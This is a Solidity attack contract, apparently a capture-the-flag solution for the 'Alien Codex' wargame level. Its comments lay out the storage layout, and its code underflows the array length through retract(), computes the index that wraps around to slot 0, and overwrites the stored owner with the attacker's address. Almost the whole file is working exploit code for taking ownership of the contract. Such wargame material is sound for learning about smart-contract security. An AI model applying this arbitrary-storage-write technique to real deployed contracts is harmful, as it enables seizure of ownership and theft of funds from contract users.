// Slot 0 = 0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272
//         |      24 nibbles=12bytes |  40 nibbles = 20bytes                  |
//         |      11bytes| boolean contacted |  20bytes owner                 |
// Slot 1 = | length of the array (integer) |

// Slot [uint256(keccak256(1)) + 0]  = first element
// Slot [uint256(keccak256(1)) + 1]  = second element

// uint256(keccak256(1)) = 0xbc36789e7a1e281436464229828f817d6612f7b477d66591ff96a9e064bcc98a
// as a decimal 85131057757245807317576516368191972321038229705283732634690444270750521936266

// AIM is to replace storage slot 1 with our address:
// 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1

pragma solidity ^0.6.0;

interface ICodex {
    function make_contact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AttackCodex {
    ICodex level; 
    constructor() public {
        level = ICodex(address(0x59CB0A4babd506be33EA0db70b937a8A4Dd5DfD7));
    }

    function attack() public {
        // pass the modifier
        level.make_contact();
        // overflow the codex length
        level.retract();
        // now we need to modify slot 0.
        // the equation that governs this for a dynamic array at slot 1 is:
        // slot number = uint256(keccak(1)) + N  = 0 
        // We need to overflow 2^256 
        // uint256(keccak(1)) + N = 2^256
        // N = web3.utils.toBN(2).pow(web3.utils.toBN(256)).sub(web3.utils.toBN(web3.utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001'))).toString()
        // N = '35707666377435648211887908874984608119992236509074197713628505308453184860938'
          
        uint256 N = 35707666377435648211887908874984608119992236509074197713628505308453184860938;
        bytes32 content = 0x000000000000000000000000935902bC8136E3477Bfc420f68CA98297196c1C1;
        level.revise(N, content);
    }    

}
